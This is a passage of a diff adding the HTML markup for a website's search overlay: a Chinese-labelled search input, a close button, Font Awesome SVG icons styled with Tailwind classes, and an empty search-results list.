+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="搜索"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="关闭 (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
